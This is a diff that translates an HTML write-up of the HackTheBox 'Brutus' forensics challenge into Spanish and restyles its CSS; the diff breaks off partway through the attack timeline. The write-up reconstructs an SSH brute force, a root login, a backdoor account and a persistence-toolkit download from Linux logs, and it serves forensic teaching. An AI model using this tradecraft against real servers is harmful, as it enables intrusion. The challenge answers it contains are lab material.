@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -46,80 +46,51 @@
   }
   .hero::before {
     content: '';
-    position: absolute;
-    top: -60px; right: -60px;
+    position: absolute; top: -60px; right: -60px;
     width: 400px; height: 400px;
     background: radial-gradient(circle, rgba(74,222,128,0.07) 0%, transparent 70%);
     pointer-events: none;
   }
   .hero::after {
     content: '>';
-    position: absolute;
-    bottom: 20px; right: 40px;
-    font-size: 140px;
-    font-family: monospace;
-    color: rgba(74,222,128,0.04);
-    pointer-events: none;
+    position: absolute; bottom: 20px; right: 40px;
+    font-size: 140px; font-family: monospace;
+    color: rgba(74,222,128,0.04); pointer-events: none;
   }
   .hero-inner { max-width: 1200px; margin: 0 auto; }
-  .hero-meta {
-    display: flex; align-items: center; gap: 10px;
-    flex-wrap: wrap; margin-bottom: 20px;
-  }
+  .hero-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
   .tag {
     display: inline-flex; align-items: center; gap: 5px;
     padding: 3px 10px; border-radius: 4px;
-    font-size: 11px; font-weight: 600; letter-spacing: 0.5px;
-    text-transform: uppercase;
+    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
   }
   .tag-platform { background: rgba(74,222,128,0.12); color: var(--accent); border: 1px solid rgba(74,222,128,0.25); }
   .tag-category { background: rgba(96,165,250,0.1); color: var(--blue); border: 1px solid rgba(96,165,250,0.2); }
   .tag-diff { background: rgba(74,222,128,0.1); color: var(--green); border: 1px solid rgba(74,222,128,0.2); }
   .tag-staff { background: rgba(251,191,36,0.1); color: var(--yellow); border: 1px solid rgba(251,191,36,0.2); }
-  .hero h1 {
-    font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px;
-    margin-bottom: 14px; line-height: 1.1;
-  }
+  .hero h1 { font-size: 2.8rem; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 14px; line-height: 1.1; }
   .hero h1 span { color: var(--accent); }
-  .hero-sub {
-    color: var(--text-dim); font-size: 1.05rem; max-width: 680px;
-    margin-bottom: 28px; line-height: 1.6;
-  }
-  .hero-stats {
-    display: flex; gap: 28px; flex-wrap: wrap;
-  }
+  .hero-sub { color: var(--text-dim); font-size: 1.05rem; max-width: 680px; margin-bottom: 28px; line-height: 1.6; }
+  .hero-stats { display: flex; gap: 28px; flex-wrap: wrap; }
   .stat { display: flex; flex-direction: column; gap: 2px; }
   .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
   .stat-value { font-size: 1.1rem; font-weight: 700; color: var(--text); }
   .stat-value.green { color: var(--accent); }
 
   /* ─── LAYOUT ─── */
-  .container { max-width: 1200px; margin: 0 auto; padding: 40px 40px; }
+  .container { max-width: 1200px; margin: 0 auto; padding: 40px; }
   .grid { display: grid; grid-template-columns: 1fr 320px; gap: 32px; align-items: start; }
 
   /* ─── SIDEBAR ─── */
   .sidebar { position: sticky; top: 24px; display: flex; flex-direction: column; gap: 20px; }
-  .sidebar-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 20px;
-  }
-  .sidebar-card h4 {
-    font-size: 11px; text-transform: uppercase; letter-spacing: 1px;
-    color: var(--accent); margin-bottom: 14px; font-weight: 700;
-  }
-  .detail-row {
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 7px 0; border-bottom: 1px solid var(--border);
-    font-size: 13px;
-  }
+  .sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; }
+  .sidebar-card h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 14px; font-weight: 700; }
+  .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid var(--border); font-size: 13px; }
   .detail-row:last-child { border-bottom: none; }
   .detail-label { color: var(--text-muted); }
   .detail-value { color: var(--text); font-weight: 600; text-align: right; max-width: 160px; }
   .detail-value.green { color: var(--accent); }
 
-  /* Skills bar */
   .skill-item { margin-bottom: 12px; }
   .skill-header { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
   .skill-name { color: var(--text-dim); }
@@ -127,112 +98,31 @@
   .skill-bar { height: 5px; background: var(--bg3); border-radius: 3px; overflow: hidden; }
   .skill-fill { height: 100%; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); border-radius: 3px; }
 
-  /* Tools list */
   .tool-list { display: flex; flex-direction: column; gap: 8px; }
-  .tool-item {
-    display: flex; align-items: center; gap: 10px;
-    padding: 8px 10px; border-radius: 6px;
-    background: var(--bg3); border: 1px solid var(--border);
-    font-size: 12px; color: var(--text-dim);
-  }
+  .tool-item { display: flex; align-items: center; gap: 10px; padding: 8px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 12px; color: var(--text-dim); }
   .tool-icon { font-size: 14px; }
 
-  /* ToC */
   .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
-  .toc-list li a {
-    display: block; padding: 6px 10px; border-radius: 5px;
-    font-size: 12px; color: var(--text-muted); text-decoration: none;
-    border-left: 2px solid transparent; transition: all 0.15s;
-  }
+  .toc-list li a { display: block; padding: 6px 10px; border-radius: 5px; font-size: 12px; color: var(--text-muted); text-decoration: none; border-left: 2px solid transparent; transition: all 0.15s; }
   .toc-list li a:hover { color: var(--accent); border-left-color: var(--accent); background: var(--accent-glow); }
 
-  /* MITRE tags */
   .mitre-list { display: flex; flex-direction: column; gap: 6px; }
-  .mitre-item {
-    display: flex; align-items: flex-start; gap: 8px;
-    padding: 7px 10px; border-radius: 6px;
-    background: var(--bg3); border: 1px solid var(--border);
-    font-size: 11px;
-  }
+  .mitre-item { display: flex; align-items: flex-start; gap: 8px; padding: 7px 10px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--border); font-size: 11px; }
   .mitre-id { color: var(--accent); font-family: monospace; font-weight: 700; white-space: nowrap; font-size: 11px; }
   .mitre-name { color: var(--text-dim); line-height: 1.3; }
 
-  /* ─── MAIN CONTENT ─── */
+  /* ─── MAIN ─── */
   .section { margin-bottom: 48px; }
-  .section-header {
-    display: flex; align-items: center; gap: 12px;
-    margin-bottom: 22px; padding-bottom: 12px;
-    border-bottom: 1px solid var(--border);
-  }
-  .section-number {
-    width: 30px; height: 30px; border-radius: 6px;
-    background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25);
-    display: flex; align-items: center; justify-content: center;
-    font-size: 12px; font-weight: 800; color: var(--accent);
-    flex-shrink: 0;
-  }
+  .section-header { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+  .section-number { width: 30px; height: 30px; border-radius: 6px; background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 800; color: var(--accent); flex-shrink: 0; }
   .section h2 { font-size: 1.25rem; font-weight: 700; color: var(--text); }
   .section p { color: var(--text-dim); margin-bottom: 14px; line-height: 1.8; }
   .section p:last-child { margin-bottom: 0; }
 
-  /* Cards */
-  .card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 20px;
-    margin-bottom: 16px;
-  }
-  .card h3 {
-    font-size: 0.95rem; font-weight: 700; color: var(--text);
-    margin-bottom: 10px;
-  }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 16px; }
+  .card h3 { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 10px; }
 
-  /* Phase steps */
-  .phase-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 14px; margin-top: 14px; }
-  .phase-card {
-    background: var(--card2); border: 1px solid var(--border);
-    border-radius: 8px; padding: 14px;
-    border-left: 3px solid var(--accent);
-  }
-  .phase-num { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 4px; }
-  .phase-title { font-size: 0.88rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
-  .phase-desc { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
-
-  /* Code blocks */
-  .code-block {
-    background: #050810;
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    overflow: hidden;
-    margin: 14px 0;
-    font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
-  }
-  .code-label {
-    background: var(--bg3);
-    border-bottom: 1px solid var(--border);
-    padding: 6px 14px;
-    font-size: 11px; color: var(--text-muted);
-    display: flex; align-items: center; gap: 6px;
-  }
-  .code-label span { color: var(--accent); font-weight: 600; }
-  .code-body { padding: 16px; font-size: 13px; color: #a3e635; overflow-x: auto; line-height: 1.7; }
-  .code-body .comment { color: var(--text-muted); }
-  .code-body .cmd { color: var(--accent); font-weight: 600; }
-  .code-body .param { color: var(--cyan); }
-  .code-body .value { color: var(--yellow); }
-  .code-body .ip { color: var(--orange); }
-  .code-body .user { color: var(--purple); }
-  .code-body .path { color: var(--blue); }
-  .code-body .timestamp { color: #94a3b8; }
-  .code-body .highlight { color: var(--red); font-weight: 600; }
-
-  /* Callout boxes */
-  .callout {
-    border-radius: 8px; padding: 16px 18px; margin: 14px 0;
-    display: flex; gap: 12px; align-items: flex-start;
-    font-size: 13.5px;
-  }
+  .callout { border-radius: 8px; padding: 16px 18px; margin: 14px 0; display: flex; gap: 12px; align-items: flex-start; font-size: 13.5px; }
   .callout-info { background: rgba(96,165,250,0.08); border: 1px solid rgba(96,165,250,0.2); }
   .callout-warn { background: rgba(251,191,36,0.08); border: 1px solid rgba(251,191,36,0.2); }
   .callout-danger { background: rgba(248,113,113,0.08); border: 1px solid rgba(248,113,113,0.2); }
@@ -241,19 +131,23 @@
   .callout-content { color: var(--text-dim); line-height: 1.6; }
   .callout-content strong { color: var(--text); }
 
-  /* Timeline */
+  .code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 14px 0; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; }
+  .code-label { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 6px 14px; font-size: 11px; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+  .code-label span { color: var(--accent); font-weight: 600; }
+  .code-body { padding: 16px; font-size: 13px; color: #a3e635; overflow-x: auto; line-height: 1.7; }
+  .code-body .comment { color: var(--text-muted); }
+  .code-body .cmd { color: var(--accent); font-weight: 600; }
+  .code-body .param { color: var(--cyan); }
+  .code-body .ip { color: var(--orange); }
+  .code-body .user { color: var(--purple); }
+  .code-body .path { color: var(--blue); }
+  .code-body .timestamp { color: #94a3b8; }
+  .code-body .highlight { color: var(--red); font-weight: 600; }
+
   .timeline { position: relative; padding-left: 28px; margin-top: 14px; }
-  .timeline::before {
-    content: '';
-    position: absolute; left: 9px; top: 8px; bottom: 8px;
-    width: 2px; background: var(--border);
-  }
+  .timeline::before { content: ''; position: absolute; left: 9px; top: 8px; bottom: 8px; width: 2px; background: var(--border); }
   .tl-item { position: relative; margin-bottom: 20px; }
-  .tl-dot {
-    position: absolute; left: -24px; top: 5px;
-    width: 12px; height: 12px; border-radius: 50%;
-    background: var(--bg); border: 2px solid var(--accent);
-  }
+  .tl-dot { position: absolute; left: -24px; top: 5px; width: 12px; height: 12px; border-radius: 50%; background: var(--bg); border: 2px solid var(--accent); }
   .tl-dot.red { border-color: var(--red); }
   .tl-dot.yellow { border-color: var(--yellow); }
   .tl-dot.orange { border-color: var(--orange); }
@@ -263,117 +157,53 @@
   .tl-title { font-size: 0.9rem; font-weight: 700; color: var(--text); margin-bottom: 3px; }
   .tl-desc { font-size: 12.5px; color: var(--text-dim); line-height: 1.5; }
 
-  /* Q&A Tasks */
   .task-list { display: flex; flex-direction: column; gap: 12px; }
-  .task-item {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    overflow: hidden;
-  }
-  .task-q {
-    display: flex; align-items: flex-start; gap: 12px;
-    padding: 14px 16px;
-    background: var(--card2); border-bottom: 1px solid var(--border);
-  }
-  .task-num {
-    min-width: 24px; height: 24px; border-radius: 5px;
-    background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25);
-    display: flex; align-items: center; justify-content: center;
-    font-size: 11px; font-weight: 800; color: var(--accent); flex-shrink: 0;
-  }
+  .task-item { background: var(--card); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .task-q { display: flex; align-items: flex-start; gap: 12px; padding: 14px 16px; background: var(--card2); border-bottom: 1px solid var(--border); }
+  .task-num { min-width: 24px; height: 24px; border-radius: 5px; background: var(--accent-glow); border: 1px solid rgba(74,222,128,0.25); display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 800; color: var(--accent); flex-shrink: 0; }
   .task-question { font-size: 13px; color: var(--text); font-weight: 500; line-height: 1.5; }
   .task-a { padding: 12px 16px; }
   .task-answer-row { display: flex; align-items: flex-start; gap: 10px; }
   .task-answer-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-top: 3px; white-space: nowrap; }
-  .task-answer-val {
-    font-family: monospace; font-size: 13px;
-    color: var(--accent); font-weight: 700;
-    background: rgba(74,222,128,0.08);
-    border: 1px solid rgba(74,222,128,0.2);
-    padding: 3px 10px; border-radius: 4px;
-    word-break: break-all;
-  }
+  .task-answer-val { font-family: monospace; font-size: 13px; color: var(--accent); font-weight: 700; background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.2); padding: 3px 10px; border-radius: 4px; word-break: break-all; }
   .task-explanation { font-size: 12.5px; color: var(--text-muted); margin-top: 8px; line-height: 1.6; }
 
-  /* Table */
   .data-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 14px 0; }
-  .data-table th {
-    background: var(--bg3); color: var(--text-muted);
-    font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px;
-    padding: 10px 14px; border: 1px solid var(--border);
-    font-weight: 600; text-align: left;
-  }
+  .data-table th { background: var(--bg3); color: var(--text-muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; text-align: left; }
   .data-table td { padding: 10px 14px; border: 1px solid var(--border); color: var(--text-dim); vertical-align: top; }
   .data-table tr:hover td { background: var(--bg3); }
   .data-table code { font-family: monospace; font-size: 12px; color: var(--accent); background: rgba(74,222,128,0.08); padding: 1px 5px; border-radius: 3px; }
 
-  /* Highlight boxes */
-  .highlight-box {
-    background: var(--card2);
-    border: 1px solid var(--border);
-    border-left: 4px solid var(--accent);
-    border-radius: 8px;
-    padding: 16px 18px;
-    margin: 14px 0;
-  }
-  .highlight-box .label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
-  .highlight-box .value { font-family: monospace; font-size: 13px; color: var(--text); word-break: break-all; }
-
-  /* Artifact file card */
-  .artifact-card {
-    display: flex; align-items: flex-start; gap: 14px;
-    background: var(--card2); border: 1px solid var(--border); border-radius: 8px;
-    padding: 14px; margin-bottom: 10px;
-  }
-  .artifact-icon { font-size: 22px; flex-shrink: 0; }
-  .artifact-name { font-size: 0.88rem; font-weight: 700; color: var(--accent); font-family: monospace; margin-bottom: 3px; }
-  .artifact-desc { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
-
-  /* Badge */
-  .badge {
-    display: inline-block; padding: 2px 8px; border-radius: 4px;
-    font-size: 11px; font-weight: 700;
-  }
-  .badge-green { background: rgba(74,222,128,0.12); color: var(--green); }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }
   .badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
   .badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
   .badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
   .badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
   .badge-purple { background: rgba(167,139,250,0.12); color: var(--purple); }
 
-  /* linper callout */
-  .linper-box {
-    background: linear-gradient(135deg, rgba(248,113,113,0.06), rgba(251,146,60,0.04));
-    border: 1px solid rgba(248,113,113,0.25);
-    border-radius: 10px; padding: 20px; margin: 16px 0;
-  }
+  .artifact-card { display: flex; align-items: flex-start; gap: 14px; background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 10px; }
+  .artifact-icon { font-size: 22px; flex-shrink: 0; }
+  .artifact-name { font-size: 0.88rem; font-weight: 700; color: var(--accent); font-family: monospace; margin-bottom: 3px; }
+  .artifact-desc { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
+
+  .highlight-box { background: var(--card2); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 16px 18px; margin: 14px 0; }
+  .highlight-box .label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
+  .highlight-box .value { font-family: monospace; font-size: 13px; color: var(--text); word-break: break-all; }
+
+  .linper-box { background: linear-gradient(135deg, rgba(248,113,113,0.06), rgba(251,146,60,0.04)); border: 1px solid rgba(248,113,113,0.25); border-radius: 10px; padding: 20px; margin: 16px 0; }
   .linper-box .title { font-size: 0.95rem; font-weight: 700; color: var(--red); margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
   .linper-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
-  .linper-feature {
-    background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.15);
-    border-radius: 6px; padding: 10px 12px; font-size: 12px;
-  }
+  .linper-feature { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.15); border-radius: 6px; padding: 10px 12px; font-size: 12px; }
   .linper-feature .feat-title { color: var(--red); font-weight: 700; margin-bottom: 3px; }
   .linper-feature .feat-desc { color: var(--text-muted); line-height: 1.4; }
 
-  /* Recommendations */
   .rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
-  .rec-card {
-    background: var(--card2); border: 1px solid var(--border); border-radius: 8px;
-    padding: 14px;
-  }
-  .rec-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
+  .rec-card { background: var(--card2); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
+  .rec-title { font-size: 0.82rem; font-weight: 700; color: var(--text); margin-bottom: 6px; }
   .rec-body { font-size: 12px; color: var(--text-muted); line-height: 1.5; }
 
-  /* Footer */
-  footer {
-    background: var(--bg2); border-top: 1px solid var(--border);
-    padding: 28px 40px; text-align: center;
-    color: var(--text-muted); font-size: 13px;
-  }
+  footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 28px 40px; text-align: center; color: var(--text-muted); font-size: 13px; }
   footer a { color: var(--accent); text-decoration: none; }
-  footer a:hover { text-decoration: underline; }
   .footer-name { font-size: 0.95rem; font-weight: 700; color: var(--text); margin-bottom: 4px; }
   .footer-divider { margin: 0 8px; color: var(--border); }
 
@@ -383,9 +213,7 @@
     .hero h1 { font-size: 2rem; }
     .container { padding: 30px 20px; }
     .hero { padding: 40px 20px; }
-    .phase-grid { grid-template-columns: 1fr; }
-    .linper-grid { grid-template-columns: 1fr; }
-    .rec-grid { grid-template-columns: 1fr; }
+    .linper-grid, .rec-grid { grid-template-columns: 1fr; }
   }
 </style>
 </head>
@@ -397,20 +225,20 @@
     <div class="hero-meta">
       <span class="tag tag-platform">HackTheBox Sherlock</span>
       <span class="tag tag-category">DFIR</span>
-      <span class="tag tag-diff">Very Easy</span>
+      <span class="tag tag-diff">Muy Fácil</span>
       <span class="tag tag-staff">⭐ Staff Pick</span>
     </div>
-    <h1><span>Brutus</span> — SSH Brute Force &amp; Persistence</h1>
+    <h1><span>Brutus</span> — Fuerza Bruta SSH y Persistencia</h1>
     <p class="hero-sub">
-      A Confluence server on the corporate network shows signs of compromise. An attacker performed a brute-force attack against the SSH service, obtained root access, and established persistence using a backdoor account and a Linux persistence toolkit.
+      Un servidor Confluence muestra señales de compromiso. Un atacante ejecutó un ataque de fuerza bruta contra el servicio SSH, obtuvo acceso root y estableció persistencia mediante una cuenta backdoor y un toolkit de persistencia en Linux.
     </p>
     <div class="hero-stats">
-      <div class="stat"><span class="stat-label">Platform</span><span class="stat-value">HackTheBox</span></div>
-      <div class="stat"><span class="stat-label">Category</span><span class="stat-value">DFIR</span></div>
-      <div class="stat"><span class="stat-label">Difficulty</span><span class="stat-value green">Very Easy</span></div>
-      <div class="stat"><span class="stat-label">Rating</span><span class="stat-value">4.7 / 5.0</span></div>
-      <div class="stat"><span class="stat-label">Solves</span><span class="stat-value">31,022</span></div>
-      <div class="stat"><span class="stat-label">Released</span><span class="stat-value">04 Apr 2024</span></div>
+      <div class="stat"><span class="stat-label">Plataforma</span><span class="stat-value">HackTheBox</span></div>
+      <div class="stat"><span class="stat-label">Categoría</span><span class="stat-value">DFIR</span></div>
+      <div class="stat"><span class="stat-label">Dificultad</span><span class="stat-value green">Muy Fácil</span></div>
+      <div class="stat"><span class="stat-label">Puntuación</span><span class="stat-value">4.7 / 5.0</span></div>
+      <div class="stat"><span class="stat-label">Resoluciones</span><span class="stat-value">31,022</span></div>
+      <div class="stat"><span class="stat-label">Publicado</span><span class="stat-value">04 Abr 2024</span></div>
     </div>
   </div>
 </header>
@@ -421,22 +249,23 @@
     <!-- MAIN -->
     <main>
 
-      <!-- 1. Overview -->
-      <section class="section" id="overview">
+      <!-- 1. Descripción -->
+      <section class="section" id="descripcion">
         <div class="section-header">
           <div class="section-number">1</div>
-          <h2>Challenge Overview</h2>
+          <h2>Descripción del Reto</h2>
         </div>
         <p>
-          Brutus is a foundational DFIR challenge focused on Linux authentication log analysis. The scenario involves a Confluence server that was targeted by an SSH brute-force attack, ultimately resulting in a full root compromise. Post-exploitation, the attacker established two persistence mechanisms: a backdoor local user account and a downloaded Linux persistence toolkit.
+          Brutus es un reto introductorio de DFIR centrado en el análisis de logs de autenticación en Linux. El escenario involucra un servidor Confluence que fue objetivo de un ataque de fuerza bruta SSH, resultando en un compromiso completo con privilegios de root. Una vez dentro, el atacante estableció dos mecanismos de persistencia: una cuenta de usuario local como backdoor y la descarga de un toolkit automatizado de persistencia.
         </p>
         <p>
-          The investigation relies on two classic Linux artifacts — <code style="font-family:monospace;color:var(--accent)">auth.log</code> and the binary <code style="font-family:monospace;color:var(--accent)">wtmp</code> — which together paint a complete picture of the attack timeline: from the first brute-force packet to the attacker's final command execution.
+          La investigación se basa en dos artefactos clásicos de Linux — <code style="font-family:monospace;color:var(--accent)">auth.log</code> y el archivo binario <code style="font-family:monospace;color:var(--accent)">wtmp</code> — que juntos permiten reconstruir la línea de tiempo completa del ataque: desde el primer paquete de fuerza bruta hasta el último comando ejecutado por el atacante.
         </p>
+
         <div class="callout callout-info">
           <span class="callout-icon">💡</span>
           <div class="callout-content">
-            <strong>Key concept — auth.log vs wtmp:</strong> <code style="font-family:monospace;color:var(--accent)">auth.log</code> records authentication events (password attempts, session open/close, sudo commands). <code style="font-family:monospace;color:var(--accent)">wtmp</code> is a binary file that records completed interactive login sessions — it logs the actual terminal session start, which can differ from the authentication event timestamp.
+            <strong>Concepto clave — auth.log vs wtmp:</strong> <code style="font-family:monospace;color:var(--accent)">auth.log</code> registra eventos de autenticación (intentos de contraseña, apertura/cierre de sesiones, comandos sudo). <code style="font-family:monospace;color:var(--accent)">wtmp</code> es un archivo binario que registra sesiones interactivas completadas — captura el momento en que el terminal PTY se establece realmente, lo que puede diferir del timestamp de autenticación.
           </div>
         </div>
 
@@ -445,109 +274,108 @@
             <span class="artifact-icon">📄</span>
             <div>
               <div class="artifact-name">auth.log</div>
-              <div class="artifact-desc">Linux PAM authentication log — captures SSH login attempts, session creation, sudo command execution, and account operations.</div>
+              <div class="artifact-desc">Log de autenticación PAM en Linux. Captura intentos SSH, creación de sesiones, ejecución de sudo y operaciones sobre cuentas.</div>
             </div>
           </div>
           <div class="artifact-card">
             <span class="artifact-icon">🗂️</span>
             <div>
               <div class="artifact-name">wtmp</div>
-              <div class="artifact-desc">Binary login database (UTMP format). Parsed with <code style="font-family:monospace;color:var(--accent)">utmpdump</code> or <code style="font-family:monospace;color:var(--accent)">last -f wtmp</code>. Records interactive terminal session start/end times.</div>
+              <div class="artifact-desc">Base de datos binaria de logins (formato UTMP). Se analiza con <code style="font-family:monospace;color:var(--accent)">utmpdump</code> o <code style="font-family:monospace;color:var(--accent)">last -f wtmp</code>. Registra inicio y fin de sesiones interactivas.</div>
             </div>
           </div>
         </div>
       </section>
 
-      <!-- 2. Attack Timeline -->
+      <!-- 2. Línea de Tiempo -->
       <section class="section" id="timeline">
         <div class="section-header">
           <div class="section-number">2</div>
-          <h2>Attack Timeline Reconstruction</h2>
+          <h2>Reconstrucción de la Línea de Tiempo</h2>
         </div>
         <p>
-          Cross-referencing <code style="font-family:monospace;color:var(--accent)">auth.log</code> with <code style="font-family:monospace;color:var(--accent)">wtmp</code> allows us to reconstruct the complete attack chain, from the first brute-force packet to the attacker's persistence toolkit download.
+          La correlación entre <code style="font-family:monospace;color:var(--accent)">auth.log</code> y <code style="font-family:monospace;color:var(--accent)">wtmp</code> permite reconstruir la cadena completa del ataque, desde el primer intento de fuerza bruta hasta la descarga del toolkit de persistencia.
         </p>
 
         <div class="timeline">
           <div class="tl-item">
             <div class="tl-dot red"></div>
             <div class="tl-time">2024-03-06 06:31:31 UTC</div>
-            <div class="tl-title">🔨 Brute Force Begins</div>
-            <div class="tl-desc">SSH brute-force attack initiated from <strong style="color:var(--orange)">65.2.161.68</strong>. Rapid fire of invalid user/password combinations recorded in auth.log (hundreds of failed attempts in seconds).</div>
+            <div class="tl-title">🔨 Inicio del Ataque de Fuerza Bruta</div>
+            <div class="tl-desc">Ataque de fuerza bruta SSH iniciado desde <strong style="color:var(--orange)">65.2.161.68</strong>. Se registran cientos de combinaciones de usuario/contraseña inválidas en auth.log en cuestión de segundos.</div>
           </div>
           <div class="tl-item">
             <div class="tl-dot yellow"></div>
             <div class="tl-time">2024-03-06 06:31:40 UTC</div>
-            <div class="tl-title">✅ Authentication Accepted — root</div>
-            <div class="tl-desc">auth.log records <code style="font-family:monospace;color:var(--accent)">Accepted password for root</code>. The brute force succeeded approximately 9 seconds after initiation. SSH session begins.</div>
+            <div class="tl-title">✅ Autenticación Aceptada — root</div>
+            <div class="tl-desc">auth.log registra <code style="font-family:monospace;color:var(--accent)">Accepted password for root</code>. La fuerza bruta tuvo éxito aproximadamente 9 segundos después de comenzar. La sesión SSH se inicia.</div>
           </div>
           <div class="tl-item">
             <div class="tl-dot blue"></div>
             <div class="tl-time">2024-03-06 06:32:45 UTC</div>
-            <div class="tl-title">🖥️ Manual Session Established (wtmp)</div>
-            <div class="tl-desc">wtmp records the attacker manually logging in and establishing an interactive terminal session. Session ID <strong style="color:var(--accent)">#37</strong> assigned by PAM. Note the 65-second gap from auth event — the attacker was likely validating access before proceeding.</div>
+            <div class="tl-title">🖥️ Sesión Interactiva Establecida (wtmp)</div>
+            <div class="tl-desc">wtmp registra al atacante estableciendo una sesión de terminal interactiva. Se asigna el ID de sesión <strong style="color:var(--accent)">#37</strong>. El delta de 65 segundos respecto al evento de autenticación indica que el atacante validó el acceso antes de proceder.</div>
           </div>
           <div class="tl-item">
             <div class="tl-dot purple"></div>
-            <div class="tl-time">During session — post-login</div>
-            <div class="tl-title">👤 Backdoor Account Created</div>
-            <div class="tl-desc">Attacker creates local user <strong style="color:var(--accent)">cyberjunkie</strong> with elevated privileges. This is a persistence mechanism — even if the root password is changed, the attacker retains access via this account. Technique: <span class="badge badge-red">T1136.001</span></div>
+            <div class="tl-time">Durante la sesión — post-login</div>
+            <div class="tl-title">👤 Creación de Cuenta Backdoor</div>
+            <div class="tl-desc">El atacante crea el usuario local <strong style="color:var(--accent)">cyberjunkie</strong> con privilegios elevados. Mecanismo de persistencia: aunque se cambie la contraseña de root, el atacante conserva acceso. Técnica: <span class="badge badge-red">T1136.001</span></div>
           </div>
           <div class="tl-item">
             <div class="tl-dot orange"></div>
             <div class="tl-time">2024-03-06 06:37:24 UTC</div>
-            <div class="tl-title">🔌 First SSH Session Closed</div>
-            <div class="tl-desc">auth.log records the root session being terminated. Attack phase 1 complete — initial access and backdoor account created.</div>
+            <div class="tl-title">🔌 Primera Sesión SSH Cerrada</div>
+            <div class="tl-desc">auth.log registra el cierre de la sesión root. Fase 1 del ataque completada: acceso inicial y cuenta backdoor creada.</div>
           </div>
           <div class="tl-item">
             <div class="tl-dot"></div>
             <div class="tl-time">2024-03-06 06:37:34 UTC</div>
-            <div class="tl-title">🔄 Second Login — cyberjunkie</div>
-            <div class="tl-desc">Attacker logs back in using the newly created backdoor account <strong style="color:var(--accent)">cyberjunkie</strong>, confirming the persistence mechanism works. New PAM session opened.</div>
+            <div class="tl-title">🔄 Segunda Conexión — cyberjunkie</div>
+            <div class="tl-desc">El atacante vuelve a conectarse usando la cuenta backdoor recién creada, confirmando que el mecanismo de persistencia funciona correctamente.</div>
           </div>
           <div class="tl-item">
             <div class="tl-dot red"></div>
             <div class="tl-time">2024-03-06 06:39:38 UTC</div>
-            <div class="tl-title">⬇️ Persistence Toolkit Downloaded</div>
-            <div class="tl-desc">cyberjunkie executes a privileged curl command via sudo to download <strong style="color:var(--red)">linper.sh</strong> from GitHub — a Linux persistence automation toolkit. Second-stage persistence deployment.</div>
+            <div class="tl-title">⬇️ Descarga del Toolkit de Persistencia</div>
